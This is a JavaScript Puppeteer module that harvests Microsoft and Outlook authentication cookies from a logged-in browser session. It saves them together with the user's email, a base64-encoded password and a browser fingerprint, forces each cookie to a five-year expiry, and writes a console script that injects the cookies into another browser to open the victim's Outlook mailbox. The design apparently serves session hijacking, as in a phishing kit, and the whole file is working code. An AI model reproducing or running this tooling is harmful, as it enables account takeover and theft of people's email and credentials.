const fs = require('fs');
const path = require('path');

/**
 * Microsoft Cookie Saver - Extracts and saves 13 essential authentication cookies
 * 
 * This module captures persistent authentication cookies from Microsoft/Outlook sessions.
 * It collects cookies from multiple Microsoft domains and saves them with 5-year expiry.
 * 
 * @example
 * const { saveMicrosoftCookies } = require('./cookie-saver');
 * 
 * // After successful Puppeteer login:
 * const result = await saveMicrosoftCookies(page, 'user@example.com', 'password123');
 * console.log(`Saved ${result.cookieCount} cookies to ${result.sessionFile}`);
 */

/**
 * Save Microsoft authentication cookies from an authenticated Puppeteer session
 * 
 * @param {Object} page - Puppeteer page instance (must be authenticated to Microsoft/Outlook)
 * @param {string} email - User email address (optional, for identification)
 * @param {string} password - User password (optional, will be base64 encoded if provided)
 * @returns {Promise<Object>} Object containing session file path, cookie count, and injection script path
 */
async function saveMicrosoftCookies(page, email = null, password = null) {
    try {
        console.log('🍪 Collecting 13 essential Microsoft authentication cookies...');

        // Extended list of Microsoft authentication domains
        const domains = [
            'https://login.microsoftonline.com',
            'https://login.live.com',
            'https://outlook.office.com',
            'https://outlook.office365.com',
            'https://www.office.com',
            'https://account.microsoft.com',
            'https://graph.microsoft.com',
            'https://aadcdn.msftauth.net',
            'https://aadcdn.msauth.net'
        ];

        let allCookies = [];

        // Collect cookies from current page first
        const currentCookies = await page.cookies();
        allCookies = allCookies.concat(currentCookies);
        console.log(`📦 Collected ${currentCookies.length} cookies from current page`);

        // Collect cookies from login.microsoftonline.com to get auth cookies
        try {
            console.log(`🌐 Collecting cookies from login.microsoftonline.com...`);
            await page.goto('https://login.microsoftonline.com', {
                waitUntil: 'domcontentloaded',
                timeout: 8000
            });
            const loginCookies = await page.cookies();
            allCookies = allCookies.concat(loginCookies);
            console.log(`✅ Collected ${loginCookies.length} cookies from login.microsoftonline.com`);
        } catch (e) {
            console.log(`⚠️ Could not access login.microsoftonline.com: ${e.message}`);
        }

        // Filter for essential authentication cookies only (the 13 critical ones)
        const essentialCookieNames = [
            // Core Microsoft authentication (CRITICAL)
            'ESTSAUTH', 'ESTSAUTHPERSISTENT', 'buid',

            // Outlook specific (REQUIRED)
            'luat', 'SuiteServiceProxyKey', 'OWAAppIdType',

            // Session management (MINIMAL)
            'fpc', 'stsservicecookie', 'x-ms-gateway-slice'
        ];

        // Remove duplicates and filter for essential cookies only
        const cookieMap = new Map();

        // Collect all cookies and identify the best version of each
        for (const cookie of allCookies) {
            const isEssential = essentialCookieNames.includes(cookie.name) ||
                              cookie.name.startsWith('esctx-');

            if (isEssential) {
                const cookieKey = `${cookie.name}|${cookie.domain}`;

                // Keep the cookie with the longest expiry
                if (!cookieMap.has(cookieKey) ||
                    (cookie.expires > 0 && cookie.expires > (cookieMap.get(cookieKey).expires || 0))) {
                    cookieMap.set(cookieKey, cookie);
                }
            }
        }

        // Process the unique cookies
        const uniqueCookies = [];
        for (const [key, cookie] of cookieMap) {
            // Force all cookies to be persistent with 5-year expiry
            if (cookie.expires === -1 || !cookie.expires || cookie.session) {
                cookie.expires = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                cookie.session = false;
            } else {
                // Extend existing expiry to 5 years if shorter
                const fiveYearsFromNow = Math.floor(Date.now() / 1000) + (5 * 365 * 24 * 60 * 60);
                if (cookie.expires < fiveYearsFromNow) {
                    cookie.expires = fiveYearsFromNow;
                }
            }

            // Ensure secure transmission
            cookie.secure = true;
            cookie.sameSite = 'None';

            uniqueCookies.push(cookie);
        }

        console.log(`📦 Collected ${uniqueCookies.length} essential authentication cookies (from ${allCookies.length} total cookies)`);

        // Create session data directory
        const sessionDir = 'session_data';
        if (!fs.existsSync(sessionDir)) {
            fs.mkdirSync(sessionDir, { recursive: true });
        }

        // Create session file with all cookies
        const sessionId = Date.now();
        const sessionTimestamp = new Date().toISOString();
        const sessionEmail = email || 'unknown';
        const sessionFileName = `session_${sessionId}_${sessionEmail.replace(/[^a-zA-Z0-9]/g, '_')}.json`;
        const sessionFilePath = path.join(sessionDir, sessionFileName);

        console.log(`📄 Creating session file: ${sessionFileName}`);

        // Create comprehensive session data
        const sessionData = {
            id: sessionId,
            timestamp: sessionTimestamp,
            email: sessionEmail,
            password: password ? Buffer.from(password).toString('base64') : null,
            totalCookies: uniqueCookies.length,
            domains: domains,
            cookies: uniqueCookies,
            userAgent: await page.evaluate(() => navigator.userAgent),
            browserFingerprint: {
                viewport: await page.viewport(),
                timezone: await page.evaluate(() => Intl.DateTimeFormat().resolvedOptions().timeZone),
                language: await page.evaluate(() => navigator.language)
            }
        };

        fs.writeFileSync(sessionFilePath, JSON.stringify(sessionData, null, 2));
        console.log(`💾 Session saved with ${uniqueCookies.length} cookies`);

        // Create injection script for browser console
        const sessionInjectScript = path.join(sessionDir, `inject_session_${sessionId}.js`);
        const sessionScriptContent = `
// Microsoft Session Cookie Injector
// Auto-generated on ${sessionTimestamp}
// Email: ${sessionEmail}
// Cookies: ${uniqueCookies.length}

(function() {
    console.log('🚀 Injecting ${uniqueCookies.length} Microsoft cookies for: ${sessionEmail}');

    const sessionInfo = {
        email: '${sessionEmail}',
        timestamp: '${sessionTimestamp}',
        cookieCount: ${uniqueCookies.length}
    };

    console.log('📧 Session info:', sessionInfo);

    const cookies = ${JSON.stringify(uniqueCookies, null, 4)};
    let injected = 0;

    cookies.forEach(cookie => {
        try {
            let cookieStr = cookie.name + '=' + cookie.value + ';';
            cookieStr += 'domain=' + cookie.domain + ';';
            cookieStr += 'path=' + cookie.path + ';';
            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
            if (cookie.secure) cookieStr += 'secure;';
            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';

            document.cookie = cookieStr;
            injected++;
        } catch (e) {
            console.warn('Failed to inject cookie:', cookie.name, e.message);
        }
    });

    console.log('✅ Successfully injected ' + injected + '/' + ${uniqueCookies.length} + ' cookies!');
    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test the session');

    // Auto-redirect option
    setTimeout(() => {
        if (confirm('Injected ' + injected + ' cookies for ${sessionEmail}! Open Outlook now?')) {
            window.location.href = 'https://outlook.office.com/mail/';
        }
    }, 500);
})();`;

        fs.writeFileSync(sessionInjectScript, sessionScriptContent);
        console.log(`🔧 Injection script created: ${sessionInjectScript}`);

        console.log(`✅ Session cookies saved successfully!`);
        console.log(`📄 Session file: ${sessionFilePath}`);
        console.log(`🔧 Injection script: ${sessionInjectScript}`);
        if (email) console.log(`📧 Email: ${email}`);
        if (password) console.log(`🔑 Password: [base64 encoded]`);

        return {
            success: true,
            sessionFile: sessionFilePath,
            injectionScript: sessionInjectScript,
            cookieCount: uniqueCookies.length,
            cookies: uniqueCookies,
            sessionData: sessionData
        };

    } catch (error) {
        console.error('❌ Error saving cookies:', error.message);
        throw error;
    }
}

/**
 * Load cookies from a saved session file
 * 
 * @param {string} sessionFilePath - Path to the session JSON file
 * @returns {Object} Session data including cookies array
 */
function loadSession(sessionFilePath) {
    try {
        const sessionData = JSON.parse(fs.readFileSync(sessionFilePath, 'utf8'));
        console.log(`📂 Loaded session: ${sessionData.email} (${sessionData.totalCookies} cookies)`);
        return sessionData;
    } catch (error) {
        console.error('❌ Error loading session:', error.message);
        throw error;
    }
}

/**
 * Inject cookies from a session into a Puppeteer page
 * 
 * @param {Object} page - Puppeteer page instance
 * @param {string} sessionFilePath - Path to the session JSON file
 * @returns {Promise<number>} Number of cookies injected
 */
async function injectSession(page, sessionFilePath) {
    try {
        const sessionData = loadSession(sessionFilePath);
        
        console.log(`💉 Injecting ${sessionData.totalCookies} cookies into page...`);
        
        // Set cookies in the page
        await page.setCookie(...sessionData.cookies);
        
        console.log(`✅ Injected ${sessionData.totalCookies} cookies successfully`);
        return sessionData.totalCookies;
    } catch (error) {
        console.error('❌ Error injecting session:', error.message);
        throw error;
    }
}

module.exports = {
    saveMicrosoftCookies,
    loadSession,
    injectSession
};
